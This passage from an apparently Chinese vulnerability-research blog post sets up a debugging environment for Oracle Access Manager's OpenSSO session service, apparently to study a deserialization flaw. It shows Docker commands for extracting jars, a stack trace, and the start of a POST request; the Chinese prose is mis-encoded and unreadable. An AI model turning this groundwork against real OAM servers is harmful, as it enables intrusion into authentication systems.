</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-51>51</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>// 1. ç”Ÿæˆå®¹å™¨ä¸­æ‰€æœ‰jaråŒ…å†…å®¹çš„index
</span></span><span style=display:flex><span><span style=color:#75715e># docker exec oamms find / -name *.jar 2&gt;/dev/null -exec sh -c &#34;echo {};zipinfo -1 {} | grep -Pi &#39;\.(class|java|xml|conf|json|yaml|yml|config)$&#39;;echo &#39;---&#39;; &#34; \;  &gt; oamms_tree.txt</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// indexå¤§è‡´å†…å®¹å¦‚ä¸‹ï¼Œç”¨---åˆ†éš”jaråŒ…ï¼Œæ¯ä¸ªåŒºå—ç¬¬ä¸€è¡Œæ˜¯jaråŒ…åç§°ï¼Œåç»­è·Ÿç€class/java/configç­‰ä»£ç å’Œé…ç½®æ–‡ä»¶
</span></span><span style=display:flex><span><span style=color:#75715e># tail -n 20 oamms_tree.txt </span>
</span></span><span style=display:flex><span>com/sun/tools/visualvm/coredump/resources/layer.xml
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/u01/jdk/lib/visualvm/visualvm/core/com-sun-tools-visualvm-modules-startup.jar
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/AcceptLicense$1.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/AcceptLicense.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/LicensePanel.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/Utils.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/VisualVMStartup.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$1.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$2.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$3.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$4.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog.class
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/u01/jdk/lib/visualvm/visualvm/core/locale/com-sun-tools-visualvm-modules-startup_zh_CN.jar
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/u01/jdk/lib/visualvm/visualvm/core/locale/core_visualvm.jar
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/u01/jdk/lib/visualvm/visualvm/core/locale/com-sun-tools-visualvm-modules-startup_ja.jar
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// 2. å®šä½å…³é”®ç±»æ‰€åœ¨çš„jaråŒ…ä½ç½®
</span></span><span style=display:flex><span><span style=color:#75715e># cls=&#34;oracle.security.am.pbl.transport.http.AMServlet&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1</span>
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/oam_policy_mgr1/tmp/_WL_user/oam-jars/1jy5pi/APP-INF/lib/pbl.jar
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet$1.class
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/AdminServer/tmp/_WL_user/oam-jars/n9twye/APP-INF/lib/pbl.jar
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet$1.class
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/pbl.jar
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet$1.class
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet.class
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># cls=&#34;oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1</span>
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/oam_policy_mgr1/tmp/_WL_user/oam-jars/1jy5pi/APP-INF/lib/openssoproxy.jar
</span></span><span style=display:flex><span>oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/AdminServer/tmp/_WL_user/oam-jars/n9twye/APP-INF/lib/openssoproxy.jar
</span></span><span style=display:flex><span>oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/openssoproxy.jar
</span></span><span style=display:flex><span>oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥çœ‹åˆ° <code>oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent</code>æ‰€åœ¨çš„jaråŒ…ä¸º<code>openssoproxy.jar</code> ï¼Œ<code>oracle.security.am.pbl.transport.http.AMServlet</code> æ‰€åœ¨jaråŒ…ä¸º pbl.jarï¼Œä»–ä»¬éƒ½ä½äº <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/</code> ç›®å½•ä¸‹ï¼ˆæ³¨æ„ï¼šgkvqumæ˜¯éšæœºç”Ÿæˆçš„ç›®å½•ï¼Œä¸åŒéƒ¨ç½²å®ä¾‹ä¸Šçš„è·¯å¾„å¤§æ¦‚ç‡æ˜¯ä¸åŒçš„ï¼Œä½†ç›®å½•ç»“æ„æ˜¯ä¸€æ ·çš„ï¼‰ã€‚æ‰€ä»¥æˆ‘ä»¬å°†è¯¥ç›®å½•ä¸‹çš„jaråŒ…å…¨éƒ¨ä¸‹è½½åˆ°è°ƒè¯•ä¸»æœºä¸Šã€‚</p><h2 id=ä¸‹è½½ä¾èµ–åŒ…åˆ°è°ƒè¯•ä¸»æœº>â‘¤ä¸‹è½½ä¾èµ–åŒ…åˆ°è°ƒè¯•ä¸»æœº<a hidden class=anchor aria-hidden=true href=#ä¸‹è½½ä¾èµ–åŒ…åˆ°è°ƒè¯•ä¸»æœº>#</a></h2><p>æ ¹æ®ä¸Šä¸€æ­¥çŸ¥é“æˆ‘ä»¬å…³å¿ƒçš„jaråŒ…åº”è¯¥ä¸»è¦æ˜¯åœ¨ <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/</code> ç›®å½•ä¸‹ã€‚</p><p>ä¸‹è½½oracleä¾èµ–åŒ…</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker exec oamms tar czf /tmp/oraclelib.tgz /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/
</span></span><span style=display:flex><span>docker cp oamms:/tmp/oraclelib.tgz .
</span></span></code></pre></td></tr></table></div></div><p>æ­¤å¤–æˆ‘ä»¬åç»­è°ƒè¯•è¿˜éœ€è¦ç”¨åˆ°weblogicçš„jaråŒ…ä¿¡æ¯å’Œcoherenceä¸­çš„gadgetä¿¡æ¯ï¼Œè¿™é‡Œä¸€å¹¶ç”Ÿæˆå¹¶ä¸‹è½½</p><p>ç”Ÿæˆå’Œä¸‹è½½ wlfuulclient.jar</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-49-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-49-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-49-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-49-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker exec oamms bash -c <span style=color:#e6db74>&#34;cd /u01/oracle/wlserver/server/lib &amp;&amp; java -jar /u01/oracle/wlserver/modules/com.bea.core.jarbuilder.jar&#34;</span>
</span></span><span style=display:flex><span>docker cp oamms:/u01/oracle/wlserver/server/lib/wlfullclient.jar .
</span></span></code></pre></td></tr></table></div></div><p>ä¸‹è½½coherenceä¾èµ–åŒ…</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-50-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-50-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-50-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-50-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker exec oamms tar czf /tmp/coherencelib.tgz /u01/oracle/coherence/lib/
</span></span><span style=display:flex><span>docker cp oamms:/tmp/coherencelib.tgz .
</span></span></code></pre></td></tr></table></div></div><p>è¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„å…¨éƒ¨ä¾èµ–åŒ…äº†</p><p><img loading=lazy src=image-20220707102358804.png alt=image-20220707102358804></p><h2 id=å¼€å§‹è°ƒè¯•>â‘¥å¼€å§‹è°ƒè¯•<a hidden class=anchor aria-hidden=true href=#å¼€å§‹è°ƒè¯•>#</a></h2><p>åœ¨æœ¬åœ°IDEAä¸­æ–°å»ºä¸€ä¸ªmavené¡¹ç›®</p><p><img loading=lazy src=image-20220322192017778.png alt=image-20220322192017778></p><p>å°†<code>\oracle\user_projects\domains\access_domain\servers\oam_server1\tmp\_WL_user\oam-jars\gkvqum\APP-INF\lib</code> ã€<code>/u01/oracle/coherence/lib/</code> å’Œ <code>wlfullclient.jar</code> ä¸‰ä¸ªä¾èµ–æ·»åŠ åˆ°LIBã€‚</p><p><img loading=lazy src=image-20220322192105477.png alt=image-20220322192105477></p><p>ç„¶åæ·»åŠ ä¸€ä¸ªRemote Tomcatè¿›è¡Œè°ƒè¯•</p><p><img loading=lazy src=image-20220322192158100.png alt=image-20220322192158100></p><p><img loading=lazy src=image-20220322192149683.png alt=image-20220322192149683></p><p>åœ¨<code>openssoproxy.jar</code> åŒ…çš„å‡½æ•°<code>oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent#isRequesterSessionID</code> ä¸­ä¸‹æ–­ç‚¹ï¼Œå‘é€æ­¥éª¤â‘¢æ‰€ä¸¾ä¾‹çš„åŸºæœ¬è¯·æ±‚ã€‚èƒ½å¤ŸæˆåŠŸåœ¨æ–­ç‚¹å¤„ä¸­æ­¢è¿è¡Œã€‚</p><p><img loading=lazy src=image-20220322192317081.png alt=image-20220322192317081></p><p>è‡³æ­¤å·²ç»å¯ä»¥è°ƒè¯•oammsäº†ã€‚</p><h1 id=è°ƒè¯•åˆ†æ>è°ƒè¯•åˆ†æ<a hidden class=anchor aria-hidden=true href=#è°ƒè¯•åˆ†æ>#</a></h1><h3 id=ååºåˆ—åŒ–å…¥å£>ååºåˆ—åŒ–å…¥å£<a hidden class=anchor aria-hidden=true href=#ååºåˆ—åŒ–å…¥å£>#</a></h3><p>å‚è€ƒå‰è¿°æŠ¥é”™è°ƒç”¨æ ˆå’Œæ¼æ´ä½œè€…åˆ†ææ–‡ç« </p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;Mar 22, 2022 2:33:02,196 AM GMT&gt; &lt;Warning&gt; &lt;oracle.oam.binding&gt; &lt;BEA-000000&gt; &lt;Error while processing Master Controller in PBL
</span></span><span style=display:flex><span>java.lang.NullPointerException
</span></span><span style=display:flex><span>â˜…  at oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent.isRequesterSessionID(OpenssoCheckValidSessionEvent.java:58)
</span></span><span style=display:flex><span>	at oracle.security.am.proxy.opensso.controller.OpenssoFlowController.getNextEventHint(OpenssoFlowController.java:515)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getEventHint(AbstractEventFlowController.java:193)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getSuccessFailEvent(AbstractEventFlowController.java:158)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getNextEvent(AbstractEventFlowController.java:99)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.getNextEvent(MasterController.java:236)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.processEvent(MasterController.java:615)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.processRequest(MasterController.java:788)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.process(MasterController.java:708)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221)
</span></span><span style=display:flex><span>â˜…  at oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)
</span></span><span style=display:flex><span>â€¦â€¦
</span></span></code></pre></td></tr></table></div></div><p>åœ¨<code>oracle.security.am.pbl.transport.http.AMServlet.doPost</code> å’Œ <code>oracle.security.am.pbl.PBLFlowManager#handleBaseEvent</code> é™„è¿‘ä¸‹æ–­ç‚¹ï¼Œå‘é€ä»¥ä¸‹è¯·æ±‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
</span></span><span style=display:flex><span>Connection: close
